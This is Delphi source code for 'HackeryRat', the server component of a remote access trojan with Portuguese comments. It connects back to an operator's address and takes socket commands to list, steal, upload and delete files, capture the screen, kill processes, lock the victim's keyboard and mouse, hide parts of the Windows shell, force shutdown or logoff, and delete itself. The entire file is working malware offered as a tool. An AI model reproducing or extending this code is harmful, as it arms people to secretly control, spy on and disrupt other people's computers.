{************************************************************
 *          HackeryRat - Criado por Haeckel Nogueira        *
 *                                                          *
 * PROIBIDA A ALTERA��O OU C�PIA DO SOURCE SEM AUTORIZA��O! *
 *                                                          *
 *                 Autor: Haeckel Nogueira                  *
 *             Email: haeckelnogueira@hotmail.com           *
 ************************************************************}

unit UHackeryRat;

interface

uses
  Windows,  SysUtils, Variants, Classes, Graphics,  Forms,
  ScktComp, StdCtrls, jpeg, ExtCtrls, Controls,Processes,mmsystem,shellapi,
  messages, dialogs,
  WINSOCK, MPlayer, editserver;
 type sStatus =(sSRecieveingFile,sSIdle);
type
  TForm1 = class(TForm)
    CS: TClientSocket;
    TimerConexaoReversa: TTimer;
    SS: TServerSocket;
    procedure CaptureScreen(saveto:string);
    Function GetPcName:String;
  Function UserName:string;
  function  DA_WinExit(RebootParam: Longword): Boolean;
    procedure CSError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure TimerConexaoReversaTimer(Sender: TObject);
    procedure CSRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure SSClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure SSClientError(Sender: TObject;
      Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
      var ErrorCode: Integer);
    procedure FormCreate(Sender: TObject);
    Function ListFiles(Directory:String):string;
    Function List_Drivers:String;
    Procedure SendClientFile;
    Function DeleteDir(Dir:string):Boolean;
    procedure RenameDir(OldName,NewName:string);
  private
    { Private declarations }
  public
    { Public declarations }
     procedure DeletaExe;
  end;
procedure BlockInput(ABlockInput : boolean); stdcall; external 'USER32.DLL';
var
  Form1: TForm1;
  Apelido : String;
  ToDownload ,UploadTo: string;
FS,UFs:TFileStream;
 SizeOfFile:Integer;
 ServerState:sStatus;

implementation
{$R *.dfm}

//**********************  FUN��ES  ***********************
function ShellExecuteA(hWnd: LongWord; Operation, FileName, Parameters, Directory: PAnsiChar; ShowCmd: Integer): HINST; stdcall; external 'shell32.dll';

  { FUN��O LISTAR ARQUIVOS }
function TForm1.ListFiles(Directory: String): string;
var
FileName,Filelist,Dirlist:string;
Searchrec:TWin32FindData;
Dircount,Filecount:integer;
FindHandle:THandle;
ReturnStr:string;
begin
 filecount:=0;
 dircount:=0;
 ReturnStr:='';

 try
   FindHandle:=FindFirstFile(pchar(Directory +'*.*'),searchrec);
   if FindHandle <> INVALID_HANDLE_VALUE then
   repeat
   FileName:=searchrec.cFileName;
   if((searchrec.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY)<>0)then
   begin
   dirlist:=dirlist+(filename+'|');
    dircount:=dircount+1;
    end
    else
    begin
    filelist:=filelist+(filename+'|');
    filecount:=filecount+1;
    end;
    until FindNextFile(FindHandle,searchrec)=false;
    finally
    Windows.FindClose(FindHandle);
    end;
    ReturnStr:=('Directories:'+IntToStr(dircount)+'|'+dirlist+'files:'+IntToStr(filecount)+'|'+filelist);
    Result:=ReturnStr;
end;

  { FUN��O LISTAR DRIVES }
function TForm1.List_Drivers: String;
Var
 ID : DWORD;
 i , DriverCount :Integer;
 DriverType : String;
 str:string;
begin
  result:='';
  DriverCount:=0;
  Id:=GetLogicalDrives;
  for i :=0 to 25 do begin
  if (id and(1 shl i)) <> 0 then begin
   case GetDriveType(pchar(char(ord('A')+i)+':\'))of
   DRIVE_UNKNOWN:     drivertype:=
                             'Sem informa��o';
        DRIVE_NO_ROOT_DIR: drivertype:=
                             'N�o existente';
        DRIVE_REMOVABLE:   drivertype:= 'Remov�vel';
        DRIVE_FIXED:       drivertype:= 'Local';
        DRIVE_REMOTE:      drivertype:= 'Remoto';
        DRIVE_CDROM:       drivertype:= 'CDROM';
        DRIVE_RAMDISK:     drivertype:= 'Disco Ram';
       end;
       str:=str+pchar(char(ord('A')+i)+':\')+DriverType+'|';
       DriverCount :=DriverCount + 1;
  end;
end;
 result:=('Drivers:'+IntToStr(DriverCount)+'|'+str);
 end;

  { FUN��O ENVIAR ARQUIVO }
procedure TForm1.SendClientFile;
begin
if FileExists(ToDownload)then
begin
try
fs:=TFileStream.Create(ToDownload,fmOpenRead);
fs.Position:=0;
SizeOfFile:=fs.Size;
SS.Socket.Connections[0].SendText('<FILEONWAY>'+IntToStr(SizeOfFile)+'|');
SS.Socket.Connections[0].SendStream(fs);
if FileExists('jpg.jpg')then
deletefile('jpg.jpg');
except
SS.Socket.Connections[0].SendText('<ERROR>'+'N�O FOI POSS�VEL ENVIAR O ARQUIVO');
fs.Free;
end;
end
else begin
SS.Socket.Connections[0].SendText('<ERROR>'+'O ARQUIVO N�O EXISTE');
end;
end;

  { FUN��O DELETAR PASTA }
function TForm1.DeleteDir(Dir: string): Boolean;
var
 F:TSHFileOpStruct;
begin
 ZeroMemory(@F,sizeof(f));
 with f do begin
 wFunc:=FO_DELETE;
 fFlags:=FOF_SILENT or FOF_NOCONFIRMATION;
 pFrom:=pchar(dir + #0);
 end;
 Result:=(0 = SHFileOperation(f));
end;

  { FUN��O RENOMEAR PASTA }
procedure TForm1.RenameDir(OldName, NewName: string);
Var
 F:TSHFileOpStruct;

begin
 ZeroMemory(@f,sizeof(f));
 with f do begin
 Wnd:=0;
 wFunc:=FO_RENAME;
  pFrom:=pchar(OldName+#0);
 pTo:=pchar(NewName);
 fFlags:=FOF_FILESONLY or FOF_ALLOWUNDO or
 FOF_SILENT or FOF_NOCONFIRMATION;
 end;
 end;

  { FUN��O TROCAR PAPEL DE PAREDE }
Function TrocarWallpaper(Local: String): Boolean;
begin
 try
  SystemParametersInfo(SPI_SetDeskWallPaper, 0, PChar(Local), 0);
 except
 Result:= False;
end;
end;

  { FUN��O ABRIR SITE }
Function JumpTo(aAdress: String): Boolean;
var
 buffer: String;
begin
 try
 buffer := 'http://' + aAdress;
 ShellExecute(Application.Handle, nil, PChar(buffer), nil, nil, SW_SHOWNORMAL);
 except
 Result:= False;
end;
end;

  { FUN��O TOCAR MUSICA }
Function TocarMusica(Local: String): Boolean;
var
 buffer: String;
begin
 try
 buffer := 'Play ' + Local;
 Result:= MCISendString(PChar(buffer), nil, 0, 0)=0;
 except
 Result:= False;
end;
end;

  { FUN��O PAUSAR MUSICA }
Function PausarMusica(Local: String): Boolean;
var
 buffer: String;
begin
 try
 buffer := 'Pause ' + Local;
 Result:= MCISendString(PChar(buffer), nil, 0, 0)=0;
 except
 Result:= False;
end;
end;

  { FUN��O PARAR MUSICA }
Function PararMusica(Local: String): Boolean;
var
 buffer: String;
begin
 try
 buffer := 'Stop ' + Local;
 Result:= MCISendString(PChar(buffer), nil, 0, 0)=0;
 except
 Result:= False;
end;
end;

 { CAPTURAR TELA }
procedure TForm1.CaptureScreen(saveto: string);
var
 bmp:TBitmap ;
 Dc:HDC;
 jpg:TJPEGImage;
begin
jpg:=TJPEGImage.Create;
 bmp:=TBitmap.Create ;
 bmp.Height :=Screen.Height ;
 bmp.Width:=Screen.Width ;
 dc:=GetWindowDC(GetDesktopWindow );
 BitBlt(bmp.Canvas.Handle ,0,0,Screen.Width,Screen.Height,Dc,0,0,SRCCOPY );
 releaseDC(GetDesktopWindow,dc);
 with jpg do begin
 Assign(bmp);
 SaveToFile(saveto);
 end;
 bmp.Free;
 jpg.Free;
end;

 { FUN��O DELETAR SERVIDOR }
procedure TForm1.DeletaExe;
Var Arquivo: TextFile;
begin
  AssignFile(Arquivo,ChangeFileExt(ParamStr(0),'.bat'));
  ReWrite(Arquivo);
  WriteLn(Arquivo,':1');
  WriteLn(Arquivo,Format('Erase "%s"',[ParamStr(0)]));
  WriteLn(Arquivo,Format('If exist "%s" Goto 1',[ParamStr(0)]));
  WriteLn(Arquivo,Format('Erase "%s"',[ChangeFileExt(ParamStr(0),'.bat')]));
  CloseFile(Arquivo);
  //WinExec(PChar(ChangeFileExt(ParamStr(0),'.bat')),sw_hide);
  Halt;
end;

 { FUN��O NOME DO PC }
function TForm1.GetPcName: String;
var
pc:array [0..MAX_COMPUTERNAME_LENGTH+1] of char;
Length:Cardinal;
begin
Length:=MAX_COMPUTERNAME_LENGTH+1;
GetComputerName(pc,Length);
GetPcName:=pc;
end;

{ FUN��O NOME DO USU�RIO DO PC }
function TForm1.UserName: string;
const
cnMaxUserNameLen = 254;
var
sUserName:string;
dwUserNameLen:DWord;
begin
dwUserNameLen:=cnMaxUserNameLen-1;
SetLength(sUserName,cnMaxUserNameLen );
GetUserName(PChar(sUserName),dwUserNameLen);
SetLength(sUserName,dwUserNameLen);
UserName:=sUserName;
end;

function strByteSize(Value: Longint): String;
{Retorna uma convers�o de Bytes para integer}
Const
KBYTE = Sizeof(Byte) shl 10;
MBYTE = KBYTE shl 10;
GBYTE = MBYTE shl 10;
begin
  if Value > GBYTE then
  begin
  Result := FloatToStrF(Round(Value / GBYTE),ffNumber,6,0)+' GB';
  end
  else if Value > MBYTE then
  begin
  Result := FloatToStrF(Round(Value / MBYTE),ffNumber,6,0)+' MB';
  end
  else if Value > KBYTE then
  begin
  Result := FloatToStrF(Round(Value / KBYTE),ffNumber,6,0)+' KB';
  end
  else
  begin
  Result := FloatToStrF(Round(Value),ffNumber,6,0)+' Byte';
  end;
end;

 { FUN��O DESLIGAR/REINICIAR/LOGOFF WINDOWS }
function TForm1.DA_WinExit(RebootParam: Longword): Boolean;
var
   TTokenHd: THandle;
   TTokenPvg: TTokenPrivileges;
   cbtpPrevious: DWORD;
   rTTokenPvg: TTokenPrivileges;
   pcbtpPreviousRequired: DWORD;
   tpResult: Boolean;
const
   SE_SHUTDOWN_NAME = 'SeShutdownPrivilege';
begin
   if Win32Platform = VER_PLATFORM_WIN32_NT then
   begin
     tpResult := OpenProcessToken(GetCurrentProcess(),
       TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,
       TTokenHd) ;
     if tpResult then
     begin
       tpResult := LookupPrivilegeValue(nil,
                                        SE_SHUTDOWN_NAME,
                                        TTokenPvg.Privileges[0].Luid) ;
       TTokenPvg.PrivilegeCount := 1;
       TTokenPvg.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
       cbtpPrevious := SizeOf(rTTokenPvg) ;
       pcbtpPreviousRequired := 0;
       if tpResult then
         Windows.AdjustTokenPrivileges(TTokenHd,
                                       False,
                                       TTokenPvg,
                                       cbtpPrevious,
                                       rTTokenPvg,
                                       pcbtpPreviousRequired) ;
     end;
   end;
   Result := ExitWindowsEx(RebootParam, 0) ;

end;

//********************************************************

procedure TForm1.CSRead(Sender: TObject; Socket: TCustomWinSocket);
  var
  buf:string;
  MsgLen,
  ReceiveLen:integer;
  begin
  MsgLen:=Socket.ReceiveLength;
  SetLength(buf,MsgLen);
  ReceiveLen:=Socket.ReceiveBuf(buf[1],MsgLen);
  buf:=copy(buf,1,ReceiveLen);

  { INFO: APELIDO }
If pos('<APELIDO>',buf) = 1 then
begin
 Socket.SendText('<STATUS>'+ 'APELIDO: ' + Apelido );
end;

  { INFO: SISTEMA }
If pos('<SISTEMA>',buf) = 1 then
begin
 //Socket.SendText('<STATUS>'+ 'SISTEMA: '+ JvComputerInfoEx1.OS.ProductName +' '+ JvComputerInfoEx1.OS.VersionCSDString);
end;

  { INFO: REGISTRADO PARA }
If pos('<REGISTRADO>',buf) = 1 then
begin
 //Socket.SendText('<STATUS>'+ 'SISTEMA REGISTRADO PARA: '+ JvComputerInfoEx1.Identification.RegisteredOwner);
end;

  { INFO: NOME DO USU�RIO DO PC }
If pos('<NAMEUSER>',buf) = 1 then
begin
 Socket.SendText('<STATUS>'+ 'NOME DO USU�RIO: ' + UserName);
end;

  { INFO: NOME DO PC }
If pos('<NAMEPC>',buf) = 1 then
begin
 Socket.SendText('<STATUS>'+ 'NOME DO COMPUTADOR: ' + GetPcName);
end;

  { INFO: TEMPO LIGADO }
If pos('<TEMPOLIGADO>',buf) = 1 then
begin
 //Socket.SendText('<STATUS>'+ 'TEMPO LIGADO: ' + JvComputerInfoEx1.Misc.TimeRunningAsString);
end;

  { INFO: PROCESSADOR }
If pos('<PROCESSADOR>',buf) = 1 then
begin
 //Socket.SendText('<STATUS>'+ 'PROCESSADOR: ' + JvComputerInfoEx1.CPU.Name);
end;

  { INFO: MEM�RIA }
If pos('<MEMORIA>',buf) = 1 then
begin
 //Socket.SendText('<STATUS>'+ 'MEM�RIA: ' + strByteSize(JvComputerInfoEx1.Memory.TotalPhysicalMemory));
end;

  { FECHAR SERVIDOR }
If pos('<EXITSERVER>',buf) = 1 then
begin
 Application.Terminate;
end;

  { DELETAR SERVIDOR }
If pos('<DELSERVER>',buf) = 1 then
begin
 DeletaExe;
end;
end;

procedure TForm1.CSError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
begin
 errorcode:=0;
end;

procedure TForm1.TimerConexaoReversaTimer(Sender: TObject);
begin
 if not CS.Active then
  CS.Active := true;
end;

procedure TForm1.SSClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
  var
  buf:string;
  MsgLen,
  ReceiveLen:integer;
  i:Integer;
  DA_CANVAS:TCanvas;
  filetodelete,FileToReName,NewName,DirToRename:string;
  begin
  MsgLen:=Socket.ReceiveLength;
  SetLength(buf,MsgLen);
  ReceiveLen:=Socket.ReceiveBuf(buf[1],MsgLen);
  buf:=copy(buf,1,ReceiveLen);

 { LISTAR ARQUIVOS E PASTAS }
if pos('<GETFILES>',buf) = 1 then
begin
 delete(buf,1,10);
 Socket.SendText('<LISTOFFILES>'+ListFiles(buf));
end;

 { LISTAR DRIVES }
if pos('<GETDRIVERS>',buf) = 1 then
begin
 Socket.SendText('<DRIVERLIST>'+List_Drivers);
end;

 { DOWNLOAD DO ARQUIVO }
if pos('<GETFILE>',buf)=1 then
begin
 delete(buf,1,9);
 ToDownload:=copy(buf,1,length(buf));
 SendClientFile;
end;

 { UPLOAD DO ARQUIVO }
if pos('<UPLOAD>',Buf) = 1 then
begin
   SizeOfFile:=StrToInt(copy(buf,9,pos('|',buf)-9));
   delete(buf,1,pos('|',Buf));
   UploadTo:=copy(buf,1,Pos('|',Buf)-1);
   delete(buf,1,pos('|',buf));
   ServerState:=sSRecieveingFile;
   UFS:=TFileStream.Create(UploadTo,fmCreate or fmOpenWrite);
   end;
    case ServerState of sSRecieveingFile :
    begin
    try
    begin
    ufs.Write(buf[1],length(buf));
    Dec(SizeOfFile,length(buf));
    if SizeOfFile = 0 then
    begin
    ServerState:=sSIdle;
    SS.Socket.Connections[0].SendText('<RESULT>'+'UPLOAD DO ARQUIVO ' + UploadTo +' CONCLU�DO...');
    UFs.free;
    sleep(1500);
    Socket.SendText('<LISTOFFILES>'+ListFiles(ExtractFileDir(UploadTo)));
    end;
    end;
    except begin
    ufs.Free;
    SS.Socket.Connections[0].SendText('<RESULT>'+'N�O FOI CONCLU�DO O UPLOAD!');
end;
 end;
end;
end;

 { DELETAR ARQUIVO }
if pos('<DELETEFILE>',buf) = 1 then begin
delete(buf,1,12);
filetodelete :=buf;
FileSetAttr(filetodelete,NOT faReadOnly or faSysFile );
FileSetAttr(filetodelete,NOT faAnyFile);
DeleteFile(filetodelete);
Socket.SendText('<RESULT>'+filetodelete+' FOI DELETADO!');
sleep(1500);
 Socket.SendText('<LISTOFFILES>'+ListFiles(ExtractFileDir(filetodelete)));
end;

 { DELETAR PASTA }
if pos('<DELETEDIR>',buf) = 1 then
begin
delete(buf,1,11);
DeleteDir(pchar(buf));
Socket.SendText('<RESULT>'+ 'PASTA '+buf+' REMOVIDA!');
sleep(1500);
  Socket.SendText('<LISTOFFILES>'+ListFiles(ExtractFileDir(buf)));
end;

 { EXECUTAR ARQUIVO }
if pos('<EXECUTE>',buf) = 1 then
begin
 delete(buf,1,9);
// ShellExecuteA(0,'open',pchar(buf),nil,nil,SW_SHOWNORMAL );
Socket.SendText('<RESULT>'+buf+' FOI ABERTO...');
end;

 { RENOMEAR ARQUIVO }
if pos('<RENAMEFILE>',buf) = 1 then
begin
delete(buf,1,12);
 FileToReName:=Copy(buf,1,pos('|',buf)-1);
 delete(buf,1,pos('|',buf));
 NewName:=buf;
 RenameFile(FileToReName,NewName);
 sleep(1500);
 Socket.SendText('<LISTOFFILES>'+ListFiles(ExtractFileDir(FileToReName)+'\'));

end;

 { RENOMEAR PASTA }
if pos('<RENAMEDIR>',buf) = 1 then
begin
delete(buf,1,11);
DirToRename:=copy(buf,1,pos('|',buf)-1);
delete(buf,1,pos('|',buf));
 ReNameDir(DirToRename,buf);
  sleep(1500);
  Socket.SendText('<LISTOFFILES>'+ListFiles(ExtractFileDir(DirToReName)+'\'));
end;

 { CAPTURAR TELA }
if pos('<CAPTURE>',buf) = 1 then
begin
capturescreen('jpg.jpg');
ToDownload:= 'jpg.jpg';
   SendClientFile;
end;

 { LISTAR PROCESSOS }
if pos('<LISTPROCE>',buf) = 1 then
begin                           //
 Socket.SendText(ListProcesses);
end;

 { FECHAR PROCESSOS }
if pos('<KILLPROC>',buf) = 1 then
begin
delete(buf,1,10);
i:=KillProcess(buf);

if i = 1 then
begin
Socket.SendText('<RESULT>'+buf+' FOI ENCERRADO!');
sleep(1500);
  Socket.SendText(ListProcesses);
  end;
if i = 0 then
 Socket.SendText('<RESULT>'+'N�O FOI POSS�VEL ENCERRAR O PROCESSO '+BUF);
 end;

  { MENSAGEM DE INFORMA��O }
If pos('<MSG1>',buf) = 1 then
begin
delete(buf,1,6);
Application.MessageBox(pchar(buf),'Informa��o', MB_OK + MB_ICONINFORMATION);
 Socket.SendText('<RESULT>'+'MENSAGEM DE AVISO ENVIADA!');
end;

  { MENSAGEM DE AVISO }
If pos('<MSG2>',buf) = 1 then
begin
delete(buf,1,6);
Application.MessageBox(pchar(buf),'Aviso', MB_OKCANCEL + MB_ICONWARNING);
 Socket.SendText('<RESULT>'+'MENSAGEM DE ADVERT�NCIA ENVIADA!');
end;

  { MENSAGEM DE ERRO }
If pos('<MSG3>',buf) = 1 then
begin
delete(buf,1,6);
Application.MessageBox(pchar(buf),'Erro', MB_OK + MB_ICONERROR);
 Socket.SendText('<RESULT>'+'MENSAGEM DE ERRO ENVIADA!');
end;

  { MENSAGEM DE CONFIRMA��O }
If pos('<MSG4>',buf) = 1 then
begin
delete(buf,1,6);
Application.MessageBox(pchar(buf),'Confirma��o', MB_YESNO + MB_ICONQUESTION);
 Socket.SendText('<RESULT>'+'MENSAGEM DE CONFIRMA��O ENVIADA!');
end;

  { ABRIR CALCULADORA }
If pos('<CALCULADORA>',buf) = 1 then
begin
WinExec('calc.exe', sw_show);
 Socket.SendText('<RESULT>'+'CALCULADORA FOI ABERTA!');
end;

  { ABRIR MSN }
If pos('<MSN>',buf) = 1 then
begin
WinExec('C:\Arquivos de programas\Windows Live\Messenger\msnmsgr.EXE', sw_show);
 Socket.SendText('<RESULT>'+'MSN FOI ABERTO!');
end;

  { ABRIR INTERNET EXPLORER }
If pos('<IEXPLORER>',buf) = 1 then
begin
WinExec('C:\Arquivos de programas\Internet Explorer\iexplore.exe', sw_show);
 Socket.SendText('<RESULT>'+'INTERNET EXPLORER FOI ABERTO!');
end;

  { ABRIR PAINT }
If pos('<PAINT>',buf) = 1 then
begin
WinExec('MSPAINT.exe', sw_show);
 Socket.SendText('<RESULT>'+'PAINT FOI ABERTO!');
end;

  { ABRIR WORDPAD }
If pos('<WORDPAD>',buf) = 1 then
begin
WinExec('C:\Arquivos de programas\Windows NT\Acess�rios\wordpad.exe', sw_show);
 Socket.SendText('<RESULT>'+'WORDPAD FOI ABERTO!');
end;

  { ABRIR WINRAR }
If pos('<WINRAR>',buf) = 1 then
begin
WinExec('C:\Arquivos de programas\WinRAR\WinRAR.exe', sw_show);
 Socket.SendText('<RESULT>'+'WINRAR FOI ABERTO!');
end;

  { ABRIR MS-DOS }
If pos('<MSDOS>',buf) = 1 then
begin
WinExec('CMD.exe', sw_show);
 Socket.SendText('<RESULT>'+'MS-DOS FOI ABERTO!');
end;

  { ABRIR WINDOWS MEDIA PLAYER }
If pos('<WMP>',buf) = 1 then
begin
WinExec('C:\Arquivos de programas\Windows Media Player\wmplayer.exe', sw_show);
 Socket.SendText('<RESULT>'+'WINDOWS MEDIA PLAYER FOI ABERTO!');
end;

  { ABRIR TECLADO VIRTUAL }
If pos('<VIRTUAL>',buf) = 1 then
begin
WinExec('system32\osk.exe', sw_show);
 Socket.SendText('<RESULT>'+'TECLADO VIRTUAL FOI ABERTO!');
end;

  { ABRIR GRAVADOR DE SOM }
If pos('<GRAVADOR>',buf) = 1 then
begin
WinExec('system32\sndrec32.exe', sw_show);
 Socket.SendText('<RESULT>'+'GRAVADOR DE SOM FOI ABERTO!');
end;

  { ABRIR CONTROLE DE VOLUME }
If pos('<VOLUME>',buf) = 1 then
begin
WinExec('system32\sndvol32.exe', sw_show);
 Socket.SendText('<RESULT>'+'CONTROLE DE VOLUME FOI ABERTO!');
end;

  { ABRIR MAPA DE CARACTERES }
If pos('<MAPA>',buf) = 1 then
begin
WinExec('system32\charmap.exe', sw_show);
 Socket.SendText('<RESULT>'+'MAPA DE CARACTERES FOI ABERTO!');
end;

  { ABRIR RESTAURA��O DO SISTEMA }
If pos('<RESTORE>',buf) = 1 then
begin
WinExec('system32\restore\rstrui.exe', sw_show);
 Socket.SendText('<RESULT>'+'RESTAURA��O DO SISTEMA FOI ABERTA!');
end;

  { ABRIR WINDOWS EXPLORER }
If pos('<EXPLORER>',buf) = 1 then
begin
WinExec('explorer.exe', sw_show);
 Socket.SendText('<RESULT>'+'WINDOWS EXPLORER FOI ABERTO!');
end;

   { ABRIR SITE }
If pos('<SITE>',buf) = 1 then
begin
delete(buf,1,6);
if JumpTo(buf) then
Socket.SendText('<RESULT>'+'O SITE ' +buf+ ' FOI ABERTO!');
end;

  { MUDAR NOME DO DISCO LOCAL }
If pos('<NOMEDISCO>',buf) = 1 then
begin
delete(buf,1,11);
SetVolumeLabel('c:\', PCHAR(BUF));
 Socket.SendText('<RESULT>'+'NOME DO DISCO LOCAL FOI ALTERADO PARA: '+BUF);
end;

  { TRAVAR MOUSE E TECLADO }
If pos('<TRAVARMOUSETECLADO>',buf) = 1 then
begin
 BlockInput(True);
 Socket.SendText('<RESULT>'+'MOUSE E TECLADO FORAM TRAVADOS!');
end;

  { DESTRAVAR MOUSE E TECLADO }
If pos('<DESTRAVARMOUSETECLADO>',buf) = 1 then
begin
 BlockInput(false);
 Socket.SendText('<RESULT>'+'MOUSE E TECLADO FORAM DESTRAVADOS!');
end;

 { ABRIR CD/DVD }
If pos('<OPENCD>',buf) = 1 then
begin
delete(buf,1,8);
mciSendString(pchar(buf),nil,0,0);
 Socket.SendText('<RESULT>'+'CD/DVD ABERTO COM SUCESSO!');
end;

{ FECHAR CD/DVD }
If Pos('<CLOSECD>',buf) = 1 then
begin
delete(buf,1,9);
mciSendString(pchar(buf),nil,0,0);
Socket.SendText('<RESULT>'+'CD/DVD FECHADO COM SUCESSO!')
end;

 { ESCONDER BOT�O INICIAR }
If Pos('<HIDESTARTBTN>',buf) = 1 then
begin
ShowWindow(FindWindowEx(FindWindow('Shell_traywnd',nil),0,'button',nil),SW_HIDE);
Socket.SendText('<RESULT>'+'BOT�O INICIAR EST� OCULTO!');
end;

 { MOSTRAR BOT�O INICIAR }
if pos('<SHOWSTARTBTN>',buf)=1 then
begin
ShowWindow(FindWindowEx(FindWindow('Shell_trayWnd',nil),0,'button',nil),SW_SHOWNORMAL);
socket.SendText('<RESULT>'+'BOT�O INICIAR EST� VIS�VEL!');
end;

  { INVERTER BOT�ES DO MOUSE }
If pos('<INVERTERMOUSE>',buf) = 1 then
begin
 SwapMouseButton(true);
 Socket.SendText('<RESULT>'+'BOT�ES DO MOUSE INVERTIDOS!');
end;

  { DESINVERTER BOT�ES DO MOUSE }
If pos('<DESINVERTERMOUSE>',buf) = 1 then
begin
 SwapMouseButton(false);
 Socket.SendText('<RESULT>'+'BOT�ES DO MOUSE NORMAIS!');
end;

 { ESCONDER BARRA DE TAREFAS }
If Pos('<HIDETASKBAR>',Buf) = 1 then
begin
ShowWindow(FindWindow('Shell_trayWnd',nil),SW_HIDE);
Socket.SendText('<RESULT>'+'BARRA DE TARFAS EST� OCULTA!');
end;

 { MOSTRAR BARRA DE TAREFAS }
If Pos('<SHOWTASKBAR>',buf) = 1 then
begin
ShowWindow(FindWindow('shell_trayWnd',nil),SW_SHOWNORMAL);
Socket.SendText('<RESULT>'+'BARRA DE TAREFAS EST� VIS�VEL!');
end;

 { ESCONDER REL�GIO }
if pos('<HIDECLOCK>',buf) = 1 then
begin
ShowWindow(FindWindowEx(FindWindowEx(FindWindow('Shell_TrayWnd', nil),HWND(0),'TrayNotifyWnd', nil), HWND(0),
'TrayClockWClass', nil), Sw_Hide) ;
Socket.SendText('<RESULT>'+'O REL�GIO EST� OCULTO!' );
end;

 { MOSTRAR REL�GIO }
if pos('<SHOWCLOCK>',buf) = 1 then
begin
ShowWindow(FindWindowEx(FindWindowEx(FindWindow('Shell_TrayWnd', nil),HWND(0),'TrayNotifyWnd', nil), HWND(0),
'TrayClockWClass', nil), SW_SHOW) ;
Socket.SendText('<RESULT>'+'O REL�GIO EST� VIS�VEL!' );
end;

 { ESCONDER BANDEJA }
if pos('<HIDETRY>',buf) = 1 then
begin
 ShowWindow(FindWindowEx(FindWindow('Shell_TrayWnd', nil),HWND(0),'TrayNotifyWnd', nil),
 Sw_Hide) ;
 Socket.SendText('<RESULT>'+'A BANDEJA EST� OCULTA!' );
 end;

 { MOSTRAR BANDEJA }
if pos('<SHOWTRY>',buf) = 1 then
begin
 ShowWindow(FindWindowEx(FindWindow('Shell_TrayWnd', nil),HWND(0),'TrayNotifyWnd', nil),
 Sw_show) ;
 Socket.SendText('<RESULT>'+'A BANDEJA EST� VIS�VEL!' );
 end;

  { ATIVAR BOT�O INICIAR }
If pos('<ATIVARINICIAR>',buf) = 1 then
begin
EnableWindow(FindWindowEx(FindWindow('Shell_TrayWnd', nil),0,'Button',nil),true);
 Socket.SendText('<RESULT>'+'BOT�O INICIAR ATIVADO!');
end;

  { DESATIVAR BOT�O INICIAR }
If pos('<DESATIVARINICIAR>',buf) = 1 then
begin
EnableWindow(FindWindowEx(FindWindow('Shell_TrayWnd', nil),  0,'Button',nil),false);
 Socket.SendText('<RESULT>'+'BOT�O INICIAR DESATIVADO!');
end;

 { ESCONDER �CONES }
if pos('<HIDEICON>',buf) = 1 then
begin
ShowWindow(FindWindowEx(FindWindow('Progman', nil), 0, 'ShellDll_DefView',  nil), SW_HIDE);
Socket.SendText('<RESULT>'+'OS �CONES EST�O OCULTOS!' );
end;

 { MOSTRAR �CONES }
if pos('<SHOWICON>',buf) = 1 then
begin
ShowWindow(FindWindowEx(FindWindow('Progman', nil), 0, 'ShellDll_DefView',  nil), SW_SHOW);
Socket.SendText('<RESULT>'+'OS �CONES EST�O VIS�VEIS!' );
end;

 { VIRAR TELA }
 if pos('<FILPSCREEN>',buf) = 1 then
 begin
  DA_CANVAS:=TCanvas.Create;
  try
  DA_CANVAS.Handle:=CreateDC('DISPLAY',nil,nil,nil);
  DA_CANVAS.CopyRect(Rect(0,0,Screen.Width,Screen.Height),da_Canvas,Rect(0,Screen.Height,Screen.Width,0));

 finally
 DA_CANVAS.Free;
 end;
 Socket.SendText('<RESULT>'+'A TELA FOI VIRADA!' );
 end;

 { DESLIGAR PC }
if pos('<SHUTDWN>',buf) = 1 then
begin
Socket.SendText('<RESULT>'+'DESLIGANDO WINDOWS...' );
DA_WinExit(EWX_SHUTDOWN or EWX_FORCE);
end;

 { REINICIAR PC }
if pos('<RESTART>',buf) = 1 then
begin
Socket.SendText('<RESULT>'+'REINICIANDO WINDOWS...' );
DA_WinExit(EWX_REBOOT or EWX_FORCE);
end;

 { FAZER LOGOFF }
if pos('<LOGOFF>',buf) = 1 then
begin
Socket.SendText('<RESULT>'+'FAZENDO LOGOFF NO WINDOWS...' );
DA_WinExit(EWX_LOGOFF or EWX_FORCE);
end;

 { TROCAR PAPEL DE PAREDE }
if pos('<WALLPAPER>',buf) = 1 then
begin
delete(buf,1,11);
 if TrocarWallpaper(buf) then
 Socket.SendText('<RESULT>'+'O PAPEL DE PAREDE FOI TROCADO!');
end;

 { TOCAR MUSICA }
if pos('<PLAYMUSIC>',buf) = 1 then
begin
delete(buf,1,11);
if TocarMusica(buf) then
Socket.SendText('<RESULT>'+'A M�SICA EST� TOCANDO...');
end;

 { PAUSAR MUSICA }
if pos('<PAUSEMUSIC>',buf) = 1 then
begin
delete(buf,1,12);
 if PausarMusica(buf) then
 Socket.SendText('<RESULT>'+'A M�SICA FOI PAUSADA...');
end;

 { PARAR MUSICA }
if pos('<STOPMUSIC>',buf) = 1 then
begin
delete(buf,1,11);
 if PararMusica(buf) then
 Socket.SendText('<RESULT>'+'A M�SICA FOI PARADA...');
end;

END;

procedure TForm1.SSClientError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
begin
errorcode:=0;
end;

procedure TForm1.FormCreate(Sender: TObject);
var
IP : String;
begin
ServerState:=sSIdle;
ExtractFromExe('IP',IP);
ExtractFromExe('APELIDO',APELIDO);
CS.Host:= IP;
end;

end.
